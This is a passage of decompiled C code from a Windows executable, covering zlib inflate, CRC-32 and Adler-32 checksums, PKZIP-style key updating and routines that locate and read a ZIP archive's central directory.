    bVar1 = *(byte *)(param_3 + (uVar9 & uVar15) * 8);
    uVar10 = (uint)bVar1;
    iVar7 = param_3 + (uVar9 & uVar15) * 8;
    uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
    if (uVar10 == 0) {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      *puVar16 = *(undefined *)(iVar7 + 4);
LAB_00407de1:
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      while ((bVar1 & 0x10) == 0) {
        if ((uVar10 & 0x40) != 0) {
          if ((uVar10 & 0x20) != 0) {
            uVar9 = (int)param_6[1] - (int)local_14;
            if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
              uVar9 = uVar4 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
            param_6[1] = local_14 + uVar9;
            pbVar3 = *param_6;
            *param_6 = pbVar11 + -uVar9;
            param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)s_invalid_literal_length_code_0041fd64;
          goto LAB_00407eb2;
        }
        iVar5 = (*(uint *)(&DAT_0041e580 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
        bVar1 = *(byte *)(iVar7 + iVar5 * 8);
        uVar10 = (uint)bVar1;
        iVar7 = iVar7 + iVar5 * 8;
        uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
        if (uVar10 == 0) {
          uVar4 = uVar4 - *(byte *)(iVar7 + 1);
          *puVar16 = *(undefined *)(iVar7 + 4);
          goto LAB_00407de1;
        }
        uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      }
      uVar10 = uVar10 & 0xf;
      uVar6 = (*(uint *)(&DAT_0041e580 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
      uVar15 = uVar15 >> (sbyte)uVar10;
      for (uVar4 = uVar4 - uVar10; uVar4 < 0xf; uVar4 = uVar4 + 8) {
        bVar1 = *pbVar11;
        local_14 = local_14 + -1;
        pbVar11 = pbVar11 + 1;
        uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
        local_c = pbVar11;
      }
      pbVar3 = (byte *)(param_4 + (uVar2 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
      uVar4 = uVar4 - pbVar3[1];
      bVar1 = *pbVar3;
      while ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          param_6[6] = (byte *)s_invalid_distance_code_0041fd80;
LAB_00407eb2:
          uVar9 = uVar4 >> 3;
          if ((uint)((int)param_6[1] - (int)local_14) <= uVar4 >> 3) {
            uVar9 = (int)param_6[1] - (int)local_14;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
          param_6[1] = local_14 + uVar9;
          pbVar3 = *param_6;
          *param_6 = pbVar11 + -uVar9;
          param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar7 = (*(uint *)(&DAT_0041e580 + (uint)bVar1 * 4) & uVar15) + *(int *)(pbVar3 + 4);
        pbVar12 = pbVar3 + iVar7 * 8;
        pbVar3 = pbVar3 + iVar7 * 8;
        uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
        uVar4 = uVar4 - pbVar3[1];
        bVar1 = *pbVar12;
      }
      uVar10 = bVar1 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
      for (; uVar4 < uVar10; uVar4 = uVar4 + 8) {
        local_14 = local_14 + -1;
        uVar15 = uVar15 | (uint)*pbVar12 << ((byte)uVar4 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_0041e580 + uVar10 * 4) & uVar15;
      uVar15 = uVar15 >> (sbyte)uVar10;
      puVar8 = puVar16 + -(uVar13 + *(int *)(pbVar3 + 4));
      puVar14 = *(undefined **)(param_5 + 0x28);
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar6;
      local_c = pbVar11;
      if (puVar8 < puVar14) {
        do {
          puVar8 = puVar8 + (*(int *)(param_5 + 0x2c) - (int)puVar14);
        } while (puVar8 < puVar14);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar8;
        if (uVar10 < uVar6) {
          iVar7 = uVar6 - uVar10;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar14 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
        else {
          *puVar16 = *puVar8;
          puVar16[1] = puVar8[1];
          puVar16 = puVar16 + 2;
          puVar8 = puVar8 + 2;
          iVar7 = uVar6 - 2;
          do {
            *puVar16 = *puVar8;
            puVar16 = puVar16 + 1;
            puVar8 = puVar8 + 1;
            iVar7 = iVar7 + -1;
          } while (iVar7 != 0);
        }
      }
      else {
        *puVar16 = *puVar8;
        puVar16[1] = puVar8[1];
        puVar16 = puVar16 + 2;
        puVar8 = puVar8 + 2;
        iVar7 = uVar6 - 2;
        do {
          *puVar16 = *puVar8;
          puVar16 = puVar16 + 1;
          puVar8 = puVar8 + 1;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
      uVar9 = (int)param_6[1] - (int)local_14;
      if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
        uVar9 = uVar4 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
      param_6[1] = local_14 + uVar9;
      pbVar3 = *param_6;
      *param_6 = pbVar11 + -uVar9;
      param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_00407f10(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 != (byte *)0x0) {
    uVar2 = ~param_2;
    if (7 < in_EAX) {
      uVar1 = in_EAX >> 3;
      do {
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((*param_1 ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[1] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[2] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[3] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[4] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[5] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[6] ^ uVar2) & 0xff) * 4);
        uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((param_1[7] ^ uVar2) & 0xff) * 4);
        param_1 = param_1 + 8;
        in_EAX = in_EAX - 8;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    for (; in_EAX != 0; in_EAX = in_EAX - 1) {
      uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_0041f938 + ((*param_1 ^ uVar2) & 0xff) * 4);
      param_1 = param_1 + 1;
    }
    return ~uVar2;
  }
  return 0;
}



void __fastcall FUN_00408040(uint param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041f938 + ((param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_0041f938 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_00408090(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_0041f938 +
                   (((uint)(byte)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) *
                   4) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_0041f938 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_00408100(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_00408240(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



undefined4 FUN_00408270(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408300(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00407400();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00408350(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_00408240;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(undefined **)(in_EAX + 0x24) = &LAB_00408260;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_00406900(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x408100);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00408270();
      return 0;
    }
    FUN_00408300();
  }
  return 0xfffffffc;
}



int FUN_00408400(void)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  byte **in_EAX;
  int iVar5;
  
  if (((in_EAX != (byte **)0x0) && ((uint *)in_EAX[7] != (uint *)0x0)) && (*in_EAX != (byte *)0x0))
  {
    iVar5 = -5;
    uVar2 = *(uint *)in_EAX[7];
    while (uVar2 < 0xe) {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        uVar3 = puVar4[1];
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if (((byte)uVar3 & 0xf) == 8) {
          if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
            *puVar4 = 1;
            goto switchD_00408438_caseD_1;
          }
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_invalid_window_size_0041ff18;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_unknown_compression_method_0041fefc;
        }
        goto LAB_00408642;
      case 1:
switchD_00408438_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar4 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
          if ((bVar1 & 0x20) != 0) {
            *(undefined4 *)in_EAX[7] = 2;
            goto switchD_00408438_caseD_2;
          }
          *puVar4 = 7;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_incorrect_header_check_0041ff2c;
          *(undefined4 *)(in_EAX[7] + 4) = 5;
        }
        break;
      case 2:
switchD_00408438_caseD_2:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
      case 3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          iVar5 = 0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_00408438_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            iVar5 = 0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_00408438_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return 2;
            }
          }
        }
        return iVar5;
      case 4:
        goto switchD_00408438_caseD_4;
      case 5:
        goto switchD_00408438_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)s_need_dictionary_0041dfa4;
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return -2;
      case 7:
        iVar5 = FUN_004069a0(*(void **)(in_EAX[7] + 0x14),iVar5);
        if (iVar5 == -3) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          iVar5 = -3;
        }
        else {
          if (iVar5 == 0) {
            return 0;
          }
          if (iVar5 != 1) {
            return iVar5;
          }
          iVar5 = 0;
          FUN_00406890();
          puVar4 = (undefined4 *)in_EAX[7];
          if (puVar4[3] == 0) {
            *puVar4 = 8;
            goto switchD_00408438_caseD_8;
          }
          *puVar4 = 0xc;
        }
        break;
      case 8:
switchD_00408438_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_00408438_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_00408438_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar4[1] == puVar4[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_00408438_caseD_c:
          return 1;
        }
        *puVar4 = 0xd;
        in_EAX[6] = (byte *)s_incorrect_data_check_0041ff44;
LAB_00408642:
        iVar5 = 0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_00408438_caseD_a;
      case 0xb:
        goto switchD_00408438_caseD_b;
      case 0xc:
        goto switchD_00408438_caseD_c;
      case 0xd:
        return -3;
      }
      uVar2 = *(uint *)in_EAX[7];
    }
  }
  return -2;
}



uint __fastcall FUN_004087b0(undefined4 param_1,void *param_2,uint param_3)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint _Size;
  char *unaff_EDI;
  
  _Size = unaff_EBX * param_3;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 4),param_2,_Size,&param_3,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[8] = '\x01';
    }
    return param_3 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x1c);
  if (*(uint *)(unaff_EDI + 0x18) < iVar1 + _Size) {
    _Size = *(uint *)(unaff_EDI + 0x18) - iVar1;
  }
  _memcpy(param_2,(void *)(*(int *)(unaff_EDI + 0x14) + iVar1),_Size);
  *(uint *)(unaff_EDI + 0x1c) = *(int *)(unaff_EDI + 0x1c) + _Size;
  return _Size / unaff_EBX;
}



undefined4 __cdecl FUN_00408810(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  byte local_5;
  size_t local_4;
  
  _Size = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + 1U) {
      _Size = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    _memcpy(&local_5,(void *)(*(int *)(unaff_ESI + 0x14) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x1c) = iVar1 + _Size;
    local_4 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 4),&local_5,1,&local_4,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  if (local_4 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[8] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_004088a0(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_4;
  
  iVar2 = FUN_00408810(&local_4);
  uVar1 = local_4;
  if (iVar2 == 0) {
    iVar2 = FUN_00408810(&local_4);
  }
  iVar4 = local_4 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00408810(&local_4);
  }
  iVar3 = local_4 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_00408810(&local_4);
    if (iVar2 == 0) {
      *unaff_EBX = local_4 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_00408920(void)

{
  int iVar1;
  DWORD DVar2;
  void *_Dst;
  uint uVar3;
  BOOL BVar4;
  int iVar5;
  size_t _Size;
  char *unaff_ESI;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;
  int iStack_4;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x1c) = *(undefined4 *)(unaff_ESI + 0x18);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    uStack_18 = *(uint *)(unaff_ESI + 0x1c);
  }
  else if (unaff_ESI[1] == '\0') {
    uStack_18 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,1);
    uStack_18 = DVar2 - *(int *)(unaff_ESI + 0xc);
  }
  uStack_14 = 0xffff;
  if (uStack_18 < 0xffff) {
    uStack_14 = uStack_18;
  }
  _Dst = _malloc(0x404);
  if (_Dst == (void *)0x0) {
    return -1;
  }
  uStack_10 = 4;
  iStack_c = -1;
  if (uStack_14 < 5) {
LAB_00408ad3:
    _free(_Dst);
    return iStack_c;
  }
  do {
    uVar3 = uStack_10 + 0x400;
    uStack_10 = uStack_14;
    if (uVar3 <= uStack_14) {
      uStack_10 = uVar3;
    }
    iStack_4 = uStack_18 - uStack_10;
    uVar3 = uStack_18 - iStack_4;
    if (0x404 < uVar3) {
      uVar3 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x1c) = iStack_4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_00408ad3;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 4),*(int *)(unaff_ESI + 0xc) + iStack_4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar5 = *(int *)(unaff_ESI + 0x1c);
      _Size = uVar3;
      if (*(uint *)(unaff_ESI + 0x18) < iVar5 + uVar3) {
        _Size = *(uint *)(unaff_ESI + 0x18) - iVar5;
      }
      _memcpy(_Dst,(void *)(*(int *)(unaff_ESI + 0x14) + iVar5),_Size);
      *(size_t *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + _Size;
    }
    else {
      BVar4 = ReadFile(*(HANDLE *)(unaff_ESI + 4),_Dst,uVar3,&uStack_8,(LPOVERLAPPED)0x0);
      _Size = uStack_8;
      if (BVar4 == 0) {
        unaff_ESI[8] = '\x01';
      }
    }
    if (_Size / uVar3 != 1) goto LAB_00408ad3;
    iVar5 = uVar3 - 3;
    do {
      iVar1 = iVar5;
      if (iVar1 < 0) goto LAB_00408abe;
      iVar5 = iVar1 + -1;
    } while ((((*(char *)(iVar5 + (int)_Dst) != 'P') || (*(char *)(iVar1 + (int)_Dst) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)_Dst) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)_Dst) != '\x06'));
    iStack_c = iVar5 + iStack_4;
LAB_00408abe:
    if ((iStack_c != 0) || (uStack_14 <= uStack_10)) goto LAB_00408ad3;
  } while( true );
}



int * FUN_00408af0(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int *piVar8;
  uint uStack_94;
  int local_90;
  int local_8c;
  int local_88;
  int aiStack_84 [7];
  int iStack_68;
  int iStack_64;
  int iStack_60;
  undefined4 uStack_8;
  
  if (in_EAX == (char *)0x0) {
    return (int *)0x0;
  }
  local_90 = 0;
  local_88 = FUN_00408920();
  if (local_88 == -1) {
    local_90 = -1;
  }
  if (*in_EAX == '\0') {
    *(int *)(in_EAX + 0x1c) = local_88;
  }
  else if (in_EAX[1] == '\0') {
    local_90 = -1;
  }
  else {
    SetFilePointer(*(HANDLE *)(in_EAX + 4),*(int *)(in_EAX + 0xc) + local_88,(PLONG)0x0,0);
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00408810(&uStack_94);
  uVar1 = uStack_94;
  iVar6 = 0;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&uStack_94), iVar2 == 0)) {
    local_8c = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_8c = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = FUN_00408810(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&uStack_94), iVar2 == 0)) {
    iVar6 = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_90 = -1;
  }
  iVar2 = FUN_00408810(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&uStack_94), iVar2 == 0)) {
    aiStack_84[1] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[1] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = aiStack_84[1];
  iVar3 = FUN_00408810(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar3 == 0) && (iVar3 = FUN_00408810(&uStack_94), iVar3 == 0)) {
    iVar5 = uStack_94 * 0x100 + uVar1;
  }
  else {
    iVar5 = 0;
    if (iVar3 != 0) {
      local_90 = -1;
    }
  }
  if (((iVar5 != iVar2) || (iVar6 != 0)) || (local_8c != 0)) {
    local_90 = -0x67;
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00408810(&uStack_94);
  uVar1 = uStack_94;
